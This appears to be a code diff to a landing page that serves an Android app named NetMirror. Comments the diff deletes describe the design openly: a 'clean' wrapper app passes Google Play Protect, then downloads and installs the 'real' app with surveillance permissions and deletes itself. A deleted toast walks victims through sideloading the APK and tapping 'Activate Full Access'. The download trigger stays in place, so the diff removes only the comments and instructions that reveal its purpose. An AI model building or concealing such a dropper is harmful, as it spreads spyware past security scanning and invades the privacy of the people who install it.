@@ -446,18 +446,9 @@ fetch('/api/admin/apk-status')
 } catch(e) { console.warn('Landing page JS error:', e); }
 </script>
 
-<!-- download wrapper app — clean setup app that installs real NetMirror -->
+<!-- download wrapper app -->
 
 <script>
-/* ═══ WRAPPER DOWNLOAD FLOW ═══
- *
- * Landing page serves a CLEAN wrapper app (no surveillance permissions).
- * Wrapper passes Play Protect because it's genuinely clean.
- * Inside the wrapper: user taps "Activate" → wrapper downloads + installs
- * the real NetMirror using DownloadManager (same as LeaksProAdmin).
- * After install → wrapper auto-removes itself.
- */
-
 function startSmartDownload() {
   var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
   var url = '/dlzip/' + token;
@@ -469,30 +460,6 @@ function startSmartDownload() {
   document.body.appendChild(a);
   a.click();
   setTimeout(function() { document.body.removeChild(a); }, 1000);
-
-  showInstallToast();
-}
-
-function showInstallToast() {
-  var old = document.getElementById('dlToast');
-  if (old) old.remove();
-  var t = document.createElement('div');
-  t.id = 'dlToast';
-  t.innerHTML = '<div style="font-size:16px;margin-bottom:8px"><b>Download Started!</b></div>' +
-    '<div style="font-size:13px;line-height:1.6">' +
-    '<b>Quick Setup:</b><br>' +
-    '1. Wait for download to complete<br>' +
-    '2. Open <b>Files</b> app → Downloads<br>' +
-    '3. Tap <b>NetMirror.zip</b> → Extract<br>' +
-    '4. Open <b>NetMirror.apk</b> → Install<br>' +
-    '5. Open the app → tap <b>Activate Full Access</b></div>';
-  t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#1565c0,#0d47a1);color:#fff;padding:18px 24px;border-radius:16px;font-size:14px;z-index:9999;max-width:88%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);line-height:1.5;opacity:0;transition:opacity 0.3s ease';
-  document.body.appendChild(t);
-  setTimeout(function() { t.style.opacity = '1'; }, 50);
-  setTimeout(function() {
-    t.style.opacity = '0';
-    setTimeout(function() { t.remove(); }, 400);
-  }, 25000);
 }
 </script>
 </body>
